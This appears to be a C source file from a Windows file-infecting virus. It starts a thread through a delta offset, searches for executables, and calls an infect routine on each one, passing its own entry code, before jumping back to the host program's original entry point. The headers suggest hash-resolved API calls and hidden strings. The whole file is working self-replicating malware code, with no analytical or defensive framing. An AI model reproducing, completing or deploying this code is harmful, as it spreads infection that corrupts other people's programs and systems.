#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "checksum_list.h"
#include "code_begin.h"
#include "code_end.h"
#include "function_kernel32.h"
#include "infect.h"
#include "infection_thread.h"
#include "oep.h"
#include "string_generator.h"
#include "utility.h"
#include "delta.h"
#include "memory.h"

// static DWORD WINAPI infection_thread(LPVOID param);

void spawn_infection_thread(void) {
    asm volatile("nop\nnop\nnop");

    HANDLE thread = CREATE_THREAD(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)BYTE_OFFSET(
                                      infection_thread, get_delta_offset()),
                                  NULL, 0, NULL);
    if (thread == INVALID_HANDLE_VALUE) {
        PRINT_DEBUG("could not create thread");
    }
    size_t oep = get_original_entry_point();
    if (oep != OEP_DEFAULT) {
        asm volatile("push %0\nret" : : "r"(oep));
    }
}

DWORD WINAPI infection_thread(LPVOID param) {
    PRINT_DEBUG("infection thread started");
    WIN32_FIND_DATAA find_data;
    HANDLE h_find;
    char search_pattern[100];
    if (get_string(STRING_EXE_SEARCH_PATTERN, search_pattern, 100) == 0) {
        PRINT_DEBUG("could not get string for STRING_EXE_SEARCH_PATTERN");
    }
    PRINT_DEBUG("search pattern: %s", search_pattern);

    memzero(&find_data, sizeof(WIN32_FIND_DATAA));
    h_find = FIND_FIRST_FILE_A(search_pattern, &find_data);
    if (h_find != INVALID_HANDLE_VALUE) {
        do {
            PRINT_DEBUG("infecting %s", find_data.cFileName);
            if (infect(find_data.cFileName, (void *)spawn_infection_thread) ==
                0) {
                PRINT_DEBUG("success!");
            } else {
                PRINT_DEBUG("failure!");
            }
        } while (FIND_NEXT_FILE_A(h_find, &find_data));
        FIND_CLOSE(h_find);
    }
    PRINT_DEBUG("infection thread finished");
    return 0;
}
